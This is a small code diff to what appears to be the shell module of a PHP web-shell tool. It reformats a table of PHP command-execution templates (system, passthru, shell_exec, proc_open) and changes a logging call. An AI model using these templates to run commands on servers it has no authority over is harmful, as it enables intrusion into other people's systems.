@@ -21,7 +21,8 @@ class Sh(Module):
                                      "exec", "pcntl_exec", "perl->system", "python_eval", "proc_open", "popen"] }
     
     
-    vectors = { 'shell.php' : { "system"       : "@system('%s 2>&1');",
+    vectors = { 'shell.php' : { 
+                               "system"       : "@system('%s 2>&1');",
                                 "passthru"     : "passthru('%s 2>&1');",
                                 "shell_exec"   : "echo shell_exec('%s 2>&1');",
                                 "proc_open"    : "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));" + \
@@ -58,7 +59,7 @@ class Sh(Module):
             
             if response == str(rand):
                 self.payload = self.vectors[interpreter][vector]
-                print "[shell.sh] Shell interpreter loaded using method '%s'" % vector
+                self.mprint("[shell.sh] Loaded using method '%s'" % vector)
                 return True
 
         except:
